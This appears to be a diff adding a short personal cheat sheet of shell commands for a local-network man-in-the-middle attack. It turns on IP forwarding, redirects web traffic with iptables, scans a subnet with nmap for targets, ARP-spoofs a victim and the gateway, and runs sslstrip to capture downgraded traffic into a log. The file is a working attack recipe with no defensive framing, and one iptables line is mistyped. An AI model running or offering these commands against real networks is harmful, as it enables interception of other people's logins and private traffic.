@@ -1,0 +1,15 @@
+1.
+echo 1 > /proc/sys/net/ipv4/ip_forward
+iptables-t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080
+iptables -t nat -L PREROUTING 
+FIND TARGET 
+	route
+	nmap 192.168.1.2-254 -vv
+	
+	
+2.
+arpspoof -i wlan0 -t 192.168.0.103 -r 192.168.0.1
+iptables -I INPUT 1 -p tcp --dport 8080 -j ACCEPT
+iptables -L INPUT
+sslstrip -l 8080
+tail -f sslstrip.log
